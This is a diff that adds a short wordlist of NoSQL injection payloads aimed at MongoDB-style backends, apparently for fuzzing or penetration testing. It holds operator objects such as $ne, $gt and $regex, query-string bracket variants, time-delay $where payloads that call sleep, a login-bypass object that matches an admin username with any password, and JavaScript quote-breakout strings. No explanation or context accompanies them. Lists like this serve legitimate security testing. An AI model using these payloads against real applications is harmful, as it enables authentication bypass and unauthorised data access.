@@ -1,0 +1,15 @@
+{"$gt": ""}
+{"$ne": null}
+{"$where": "sleep(5000)"}
+{"$regex": ".*"}
+{"$gt": "", "$lt": "z"}
+[$ne]=1
+[$gt]=
+[$regex]=.*
+[$where]=function(){sleep(5000)}
+{$nin: [1,2,3]}
+{"$or":[{"a":"a"},{"a":"a"}]}
+{"username":{"$regex":"admin"},"password":{"$gt":""}}
+';return 'a'=='a' && ''=='
+';return 'a'!='a' && ''=='
+";return "a"=="a" && ""=="
